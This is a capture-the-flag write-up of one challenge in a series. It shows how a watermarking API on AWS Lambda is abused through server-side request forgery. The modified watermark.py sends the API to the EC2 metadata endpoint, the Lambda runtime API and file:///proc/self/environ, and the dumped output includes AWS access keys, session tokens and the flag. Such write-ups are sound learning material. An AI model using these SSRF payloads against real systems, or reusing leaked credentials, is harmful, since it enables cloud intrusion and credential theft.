# 11 - Invoking the devil

## Putting It All Together

The Kanban Board from [02 - Letting you in if you ask nicely]() contained a to-do card mentioning:

> Have the security team test the watermarking API for any vulnerabilities

Also, [09 - Uncovering your deepest secrets]() gave us an ARN (`arn:aws:iam::146213847915:role/carousel-app-CiCdInvokeApiRole56EA5614-1PJVKR4MUSPFS`) to an IAM role that, I presumed I was able to assume with the AWS CLI credentials we've been using from Cognito.

Finally, [08 - Building the perfect crime]() gave us a large dump of the static site, including an AWS CodeBuild [pipeline]() that invokes a Python script called [`watermark.py`]().

The CodeBuild pipeline passes the following environment variables to `watermark.py`:

1. `SOURCE_BUCKET_NAME` – Can be found from our earlier invocation of `aws s3 ls`. It's `carousel-app-appbucketssourceimagesbucketcbdfb98c-1weh10b2l2p4m`, but also not entirely relevant to solving the challenge.

2. `API_GATEWAY_URL` – Can be found by searching the CloudTrail [audit logs]() from the last challenge. The CloudTrail audit logs show that there are two API Gateways. However, it's clear one of them is associated with the watermarking feature.

```json
. . .

"requestParameters": {
    "resourceId": "x4jk7w",
    "httpMethod": "POST",
    "putIntegrationInput": {
        "httpMethod": "POST",
        "type": "AWS_PROXY",
        "requestParameters": {},
        "uri": "arn:aws:apigateway:us-east-1:lambda:path/2015-03-31/functions/arn:aws:lambda:us-east-1:146213847915:function:carousel-app-WatermarkingApiWatermarkFunction25DB3-V4KLpzwBjOka/invocations",
        "requestTemplates": {}
    },
    "restApiId": "3c8y72vp6f",
    "template": false
},

. . .
```

There's RegEx in the `watermark.py` script that makes it clear how to assemble this URL:

```python
INVOKE_URL_REGEX = r"^[a-z0-9]+\.execute-api\.(?P<region>[a-z]{2}-[a-z]+-\d)\.amazonaws\.com$"
# 3c8y72vp6f.execute-api.us-east-1.amazonaws.com
```

Trial, error, and Python exceptions, as well as the following CloudTrail event, made me arrive at the final URL: https://3c8y72vp6f.execute-api.us-east-1.amazonaws.com/api/.

```python
"eventTime": "2021-11-15T23:26:58Z",
"eventSource": "lambda.amazonaws.com",
"eventName": "AddPermission20150331v2",
"awsRegion": "us-east-1",
"sourceIPAddress": "cloudformation.amazonaws.com",
"userAgent": "cloudformation.amazonaws.com",
"requestParameters": {
    "functionName": "arn:aws:lambda:us-east-1:146213847915:function:carousel-app-WatermarkingApiWatermarkFunction25DB3-V4KLpzwBjOka",
    "statementId": "carousel-app-WatermarkingApiwatermarkPOSTApiPermissioncarouselappWatermarkingApi79D0C9-1G68QJ7OS9J1T",
    "action": "lambda:InvokeFunction",
    "principal": "apigateway.amazonaws.com",
    "sourceArn": "arn:aws:execute-api:us-east-1:146213847915:3c8y72vp6f/api/POST/watermark"
},
```

3. `INVOKE_API_ROLE` – Can be found in [09 - Uncovering your deepest secrets](): `arn:aws:iam::146213847915:role/carousel-app-CiCdInvokeApiRole56EA5614-1PJVKR4MUSPFS`.

## Capturing the Flag

I made modifications to the existing `watermark.py` script to see how things would behave if I told it to download random files. At the suggestion of the team, I tried a few things in order:

1. [The EC2 metadata endpoint](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/instancedata-data-retrieval.html).
1. [The Lambda runtime API](https://docs.aws.amazon.com/lambda/latest/dg/runtimes-api.html). Also, see: https://twitter.com/spengietz/status/1161317376060563456.
1. `/var/proc/environ`, to see what the shell environment looks like.

<details>

```diff
diff --git a/08 - Building the perfect crime/carousel-app-appbucketsdistributionbucketc2fc3d59-crwx56j46vs4/watermark.py b/11 - Invoking the devil/watermark.py
index 4f1d364..494db23 100644
--- a/08 - Building the perfect crime/carousel-app-appbucketsdistributionbucketc2fc3d59-crwx56j46vs4/watermark.py	
+++ b/11 - Invoking the devil/watermark.py	
@@ -10,39 +10,26 @@ from aws_requests_auth.aws_auth import AWSRequestsAuth
 
 INVOKE_URL_REGEX = r"^[a-z0-9]+\.execute-api\.(?P<region>[a-z]{2}-[a-z]+-\d)\.amazonaws\.com$"
 
-SOURCE_BUCKET_NAME = os.environ["SOURCE_BUCKET_NAME"]
-API_GATEWAY_URL = os.environ["API_GATEWAY_URL"]
-INVOKE_API_ROLE = os.environ["INVOKE_API_ROLE"]
+SOURCE_BUCKET_NAME = "carousel-app-appbucketssourceimagesbucketcbdfb98c-1weh10b2l2p4m"
+API_GATEWAY_URL = "https://3c8y72vp6f.execute-api.us-east-1.amazonaws.com/api/"
+INVOKE_API_ROLE = "arn:aws:iam::146213847915:role/carousel-app-CiCdInvokeApiRole56EA5614-1PJVKR4MUSPFS"
 
 s3_client = boto3.client("s3")
 sts_client = boto3.client("sts")
 
 
 def main():
-    key_list = get_key_list()
     aws_auth = get_aws_auth()
-    image_list = []
 
-    for key in key_list:
-        image = watermark_image(generate_presigned_url(key), aws_auth)
-        image_list.append(f"/public/{image}")
+    # EC2 Metadata endpoint
+    print(watermark_image("http://169.254.169.254/latest/meta-data/", aws_auth))
 
-    print(",".join(image_list))
+    # Lambda runtime API
+    # https://docs.aws.amazon.com/lambda/latest/dg/runtimes-api.html
+    print(watermark_image("http://localhost:9001/2018-06-01/runtime/invocation/next", aws_auth))
 
-
-def get_key_list() -> List[str]:
-
-    key_list = []
-
-    paginator = s3_client.get_paginator("list_objects_v2")
-
-    response_iterator = paginator.paginate(Bucket=SOURCE_BUCKET_NAME, Delimiter="/", EncodingType="url", FetchOwner=False)
-
-    for page in response_iterator:
-        for object in page["Contents"]:
-            key_list.append(object["Key"])
-
-    return key_list
+    # The current shell environment of the Lambda function
+    print(watermark_image("file:///proc/self/environ", aws_auth))
 
 
 def get_aws_auth() -> AWSRequestsAuth:
@@ -67,11 +54,7 @@ def get_aws_temporary_credentials() -> Dict:
 
 def watermark_image(image_url: str, auth: AWSRequestsAuth) -> None:
     response = requests.post(url=f"{API_GATEWAY_URL}watermark", json={"url": image_url}, auth=auth)
-    return response.json()["uploaded_image"].split("/")[-1]
-
-
-def generate_presigned_url(key: str, expiration: int = 60) -> str:
-    return s3_client.generate_presigned_url("get_object", Params={"Bucket": SOURCE_BUCKET_NAME, "Key": key}, ExpiresIn=expiration)
+    return response.json()#["uploaded_image"].split("/")[-1]
 
 
 if __name__ == "__main__":
```

</details>

```console
$ python watermark.py
{'error': "HTTPConnectionPool(host='169.254.169.254', port=80): Max retries exceeded with url: /latest/meta-data/ (Caused by NewConnectionError('<urllib3.connection.HTTPConnection object at 0x7efe6c8a14c0>: Failed to establish a new connection: [Errno 111] Connection refused'))", 'traceback': ['  File "/var/task/handler.py", line 128, in handler\n    downloaded_image = requests.get(url, stream=True)\n', '  File "/var/task/requests/api.py", line 76, in get\n    return request(\'get\', url, params=params, **kwargs)\n', '  File "/var/task/requests/api.py", line 61, in request\n    return session.request(method=method, url=url, **kwargs)\n', '  File "/var/task/requests/sessions.py", line 542, in request\n    resp = self.send(prep, **send_kwargs)\n', '  File "/var/task/requests/sessions.py", line 655, in send\n    r = adapter.send(request, **kwargs)\n', '  File "/var/task/requests/adapters.py", line 516, in send\n    raise ConnectionError(e, request=request)\n']}
{'uploaded_image': 'waiting-for-approval/7c337dcf-8368-45de-9899-e07c53310cfb.png'}
{'uploaded_image': 'waiting-for-approval/80f8687b-5e1e-4280-b672-7dedce7c34eb.png'}
```

This lead to some revelations:

1. The first error is interesting, because it reveals the path on the file system to the Lambda function handler.

2. We can take a look at the contents of the Lambda metadatan endpoint and see some cool stuff, validating my initial thinking, but no flag.

```console
$ aws s3 cp s3://carousel-app-appbucketswatermarkedimagesbucketfce-1tojqzrov3x1u/waiting-for-approval/7c337dcf-8368-45de-9899-e07c53310cfb.png .
```

<details>

```json
{
  "resource": "/watermark",
  "path": "/watermark",
  "httpMethod": "POST",
  "headers": {
    "Accept": "*/*",
    "Accept-Encoding": "gzip, deflate",
    "CloudFront-Forwarded-Proto": "https",
    "CloudFront-Is-Desktop-Viewer": "true",
    "CloudFront-Is-Mobile-Viewer": "false",
    "CloudFront-Is-SmartTV-Viewer": "false",
    "CloudFront-Is-Tablet-Viewer": "false",
    "CloudFront-Viewer-Country": "US",
    "Content-Type": "application/json",
    "Host": "3c8y72vp6f.execute-api.us-east-1.amazonaws.com",
    "User-Agent": "python-requests/2.25.1",
    "Via": "1.1 558a7274c3bf9c351a26dc5ddb8c820b.cloudfront.net (CloudFront)",
    "X-Amz-Cf-Id": "I6tT9QkTMCLzZc6KLLR40H1k3Js9tA8kYhdxmunCcXqGBqT1JIz-Uw==",
    "x-amz-content-sha256": "2e3d94109a8be463f5495957b7ed5e2d2294f8d55b369c447c0d9ab915ff0736",
    "x-amz-date": "20211120T184229Z",
    "X-Amz-Security-Token": "FwoGZXIvYXdzEEwaDCx9EUVLblcyS2MEqSLIAcJsbsBdIG5r256btdr2N/fHL5E0Ortu56qZQ2iQxeZr7cC1Rr/Se8AbDPu2z3hs1aTy3cL1cVLwf3HR2vMeifk6Pal/HAC8FDNzwVy908kGaWfeirY1h/U5pxgPl4+shPqvtdqyw0BT42XMpu7yQTtnoRP4zs3bvRKjZjzcACOmUO3jYpJyaH9fTYSvjKI5ygvfKz+A5U8hFH2lxe4ovuz6Y3GgDMwV7EG20HPzkP+AdavYPiNzrepkRrFxQeRujNtQ6rUUN2rBKJeD5YwGMi3qbSTxyjju2USypGeObfo/RZif1L125C+F01GwQJ1zMDrHWyNyi51mszYzaTs=",
    "X-Amzn-Trace-Id": "Root=1-61994198-740a4373128868153c3a101c",
    "X-Forwarded-For": "173.49.108.108, 130.176.17.132",
    "X-Forwarded-Port": "443",
    "X-Forwarded-Proto": "https"
  },
  "multiValueHeaders": {
    "Accept": [
      "*/*"
    ],
    "Accept-Encoding": [
      "gzip, deflate"
    ],
    "CloudFront-Forwarded-Proto": [
      "https"
    ],
    "CloudFront-Is-Desktop-Viewer": [
      "true"
    ],
    "CloudFront-Is-Mobile-Viewer": [
      "false"
    ],
    "CloudFront-Is-SmartTV-Viewer": [
      "false"
    ],
    "CloudFront-Is-Tablet-Viewer": [
      "false"
    ],
    "CloudFront-Viewer-Country": [
      "US"
    ],
    "Content-Type": [
      "application/json"
    ],
    "Host": [
      "3c8y72vp6f.execute-api.us-east-1.amazonaws.com"
    ],
    "User-Agent": [
      "python-requests/2.25.1"
    ],
    "Via": [
      "1.1 558a7274c3bf9c351a26dc5ddb8c820b.cloudfront.net (CloudFront)"
    ],
    "X-Amz-Cf-Id": [
      "I6tT9QkTMCLzZc6KLLR40H1k3Js9tA8kYhdxmunCcXqGBqT1JIz-Uw=="
    ],
    "x-amz-content-sha256": [
      "2e3d94109a8be463f5495957b7ed5e2d2294f8d55b369c447c0d9ab915ff0736"
    ],
    "x-amz-date": [
      "20211120T184229Z"
    ],
    "X-Amz-Security-Token": [
      "FwoGZXIvYXdzEEwaDCx9EUVLblcyS2MEqSLIAcJsbsBdIG5r256btdr2N/fHL5E0Ortu56qZQ2iQxeZr7cC1Rr/Se8AbDPu2z3hs1aTy3cL1cVLwf3HR2vMeifk6Pal/HAC8FDNzwVy908kGaWfeirY1h/U5pxgPl4+shPqvtdqyw0BT42XMpu7yQTtnoRP4zs3bvRKjZjzcACOmUO3jYpJyaH9fTYSvjKI5ygvfKz+A5U8hFH2lxe4ovuz6Y3GgDMwV7EG20HPzkP+AdavYPiNzrepkRrFxQeRujNtQ6rUUN2rBKJeD5YwGMi3qbSTxyjju2USypGeObfo/RZif1L125C+F01GwQJ1zMDrHWyNyi51mszYzaTs="
    ],
    "X-Amzn-Trace-Id": [
      "Root=1-61994198-740a4373128868153c3a101c"
    ],
    "X-Forwarded-For": [
      "173.49.108.108, 130.176.17.132"
    ],
    "X-Forwarded-Port": [
      "443"
    ],
    "X-Forwarded-Proto": [
      "https"
    ]
  },
  "queryStringParameters": null,
  "multiValueQueryStringParameters": null,
  "pathParameters": null,
  "stageVariables": null,
  "requestContext": {
    "resourceId": "x4jk7w",
    "resourcePath": "/watermark",
    "httpMethod": "POST",
    "extendedRequestId": "JHcvzEQGIAMF5SQ=",
    "requestTime": "20/Nov/2021:18:42:32 +0000",
    "path": "/api/watermark",
    "accountId": "146213847915",
    "protocol": "HTTP/1.1",
    "stage": "api",
    "domainPrefix": "3c8y72vp6f",
    "requestTimeEpoch": 1637433752104,
    "requestId": "905a146d-630b-4b91-a346-83fc20f7661e",
    "identity": {
      "cognitoIdentityPoolId": null,
      "accountId": "146213847915",
      "cognitoIdentityId": null,
      "caller": "AROASECYGINVR43YWZ7XD:b9fe159a-3f12-401e-89c2-c0647dbad8e0",
      "sourceIp": "173.49.108.108",
      "principalOrgId": "o-byqdxxannf",
      "accessKey": "ASIASECYGINVWRRCK22A",
      "cognitoAuthenticationType": null,
      "cognitoAuthenticationProvider": null,
      "userArn": "arn:aws:sts::146213847915:assumed-role/carousel-app-CiCdInvokeApiRole56EA5614-1PJVKR4MUSPFS/b9fe159a-3f12-401e-89c2-c0647dbad8e0",
      "userAgent": "python-requests/2.25.1",
      "user": "AROASECYGINVR43YWZ7XD:b9fe159a-3f12-401e-89c2-c0647dbad8e0"
    },
    "domainName": "3c8y72vp6f.execute-api.us-east-1.amazonaws.com",
    "apiId": "3c8y72vp6f"
  },
  "body": "{\"url\": \"http://localhost:9001/2018-06-01/runtime/invocation/next\"}",
  "isBase64Encoded": false
}
```

</details>


3. Taking a look  `/proc/self/environ` yields...

```
$ aws s3 cp s3://carousel-app-appbucketswatermarkedimagesbucketfce-1tojqzrov3x1u/waiting-for-approval/80f8687b-5e1e-4280-b672-7dedce7c34eb.png .
```

<details>

```plaintext
AWS_LAMBDA_FUNCTION_VERSION=$LATEST
FLAG11=HF-Mxi5TLI0ai5ytsw9TMjAT9zNCWwjMQ30
AWS_SESSION_TOKEN=IQoJb3JpZ2luX2VjEDsaCXVzLWVhc3QtMSJHMEUCIFoyMUV1LYBpEzOlsHOLqkNWTNZBSKRu2XtKzneahoEzAiEA6fKGjc7EgxUGPUoelb2B1p/l5hkYc3Fltei8AlXfceoqzQII9P//////////ARABGgwxNDYyMTM4NDc5MTUiDM44h/3UOvl77LLFpCqhAtXr9DuuPATqS7aL2dKxEBAkIBn7+tFxMoQ22O+et1p9NYkmJotIvTKY930Y6wHoVzLPE4b3H+KxggjTeeMtJWsjfUM2tkZ69qZGWoZTCM2aR8PhxpqbNDvnKqknoijXBsyCWAc5wVDoraqh2yNuYXP6VaMse7NzWdKMO0YUHGQh4tX6/1dMboEH17K7jTC3su42GK7mxIZelQitupTIpHfGJ9nljy5DA09263xzpRC/Hi0YPm83V2ggYbG3raUnBAXOcUqFDAXX0pfAGMnqf2cs65ME8znJli3c4gY0DdXtwCV4WMyHsR9fALr7HSSmpymB3ALlQY7EUknCCzbEmRCEr5xu5bG+33gpSXYhvaMbaudazPNEa1fS0snD2wlgLH0wjoLljAY6mgHS3T+ZzgZvNplBOzJHU/8pqxhsIjrLBU15GxhHbW4Lgyi1SB3e/Gxy6WJndlWvrCfDnaTYgOZgXC4eaOqjdcn5wcLdbm5NODjwi1IBL5XjK0SR2IlrMpkl/2Ko2dW4qllHIxDZFpqBybRpqbfGjHHT1/PdKA9I0YuWzZlJUhxt8Z8eihOkbxtgWWzHsK3d9svKNcOl2wQy4L3i
AWS_LAMBDA_LOG_GROUP_NAME=/aws/lambda/carousel-app-WatermarkingApiWatermarkFunction25DB3-V4KLpzwBjOka
LD_LIBRARY_PATH=/var/lang/lib:/lib64:/usr/lib64:/var/runtime:/var/runtime/lib:/var/task:/var/task/lib:/opt/lib
LAMBDA_TASK_ROOT=/var/task
AWS_LAMBDA_RUNTIME_API=127.0.0.1:9001
AWS_LAMBDA_LOG_STREAM_NAME=2021/11/20/[$LATEST]f120d50707f344249168b1406acb09a2
AWS_EXECUTION_ENV=AWS_Lambda_python3.8
AWS_XRAY_DAEMON_ADDRESS=169.254.79.129:2000
AWS_LAMBDA_FUNCTION_NAME=carousel-app-WatermarkingApiWatermarkFunction25DB3-V4KLpzwBjOka
PATH=/var/lang/bin:/usr/local/bin:/usr/bin/:/bin:/opt/bin
AWS_DEFAULT_REGION=us-east-1
PWD=/var/task
AWS_SECRET_ACCESS_KEY=igGnay2l+wQkMxwZgkRxbHkdOWzfhtcDQoIyoCKK
LAMBDA_RUNTIME_DIR=/var/runtime
LANG=en_US.UTF-8
AWS_LAMBDA_INITIALIZATION_TYPE=on-demand
TZ=:UTC
AWS_REGION=us-east-1
AWS_ACCESS_KEY_ID=ASIASECYGINVTLVJ2ZUO
SHLVL=0
OUTPUT_BUCKET=carousel-app-appbucketswatermarkedimagesbucketfce-1tojqzrov3x1u
_AWS_XRAY_DAEMON_ADDRESS=169.254.79.129
_AWS_XRAY_DAEMON_PORT=2000
_LAMBDA_TELEMETRY_LOG_FD=3
AWS_XRAY_CONTEXT_MISSING=LOG_ERROR
_HANDLER=handler.handler
AWS_LAMBDA_FUNCTION_MEMORY_SIZE=1536
```

</details>

🚩

## Bonus

![Discord Message from Challenge's Creator](bonus.png)

(It was me.)
